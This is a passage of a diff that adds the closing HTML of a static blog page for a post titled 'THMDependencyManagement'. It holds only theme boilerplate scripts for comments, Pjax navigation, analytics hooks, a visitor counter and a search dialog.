+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'https://blog.mikannse.cn/2025/02/28/THMDependencyManagement/'
+    this.page.identifier = '/2025/02/28/THMDependencyManagement/'
+    this.page.title = 'THMDependencyManagement'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
